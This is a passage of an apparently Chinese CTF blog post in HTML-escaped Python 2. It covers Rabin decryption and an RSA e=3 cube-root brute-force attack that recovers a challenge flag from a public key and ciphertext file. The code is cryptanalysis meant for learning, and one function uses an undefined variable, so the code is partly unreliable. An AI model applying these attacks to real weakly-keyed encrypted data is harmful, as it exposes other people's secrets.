punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    cipher &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; string&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;atoi&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cipher&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; base&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# print cipher&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 计算 yp 和 yq&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;yp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;yq &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 计算 mp 和 mq&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cipher&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mq &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cipher&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; q&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 计算 a,b,c,d&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;yp &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; mq &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; yq &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; q &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; mp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; N&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; N &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;yp &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; mq &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; yq &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; q &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; mp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; N&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; N &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%x&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; i&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;0&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; s&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; s&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;hex&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;e3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#e3&#34;&gt;#&lt;/a&gt; e=3&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; gmpy2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PublicKey &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; RSA&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;public_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;./tmp/pubkey.pem&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cipher_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;./tmp/flag.enc&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#读入公钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;public_key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; RSA&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;importKey&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; key&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;n&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    e &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; key&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;e&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#读入密文&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cipher_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    cipher &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;hex&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    cipher &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cipher&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;#print(cipher)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#破解密文&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;get_flag&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;iroot&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cipher&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            flag_bin &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;iroot&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cipher&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;x&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag_bin&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;hex&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        i &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;get_flag_for&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;xrange&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;118600000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;118720000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;iroot&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cipher&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;x&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            flag_bin &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;iroot&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cipher&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;x&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag_bin&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;hex&#34;&lt;/span&gt;&lt;span class=&#34;token 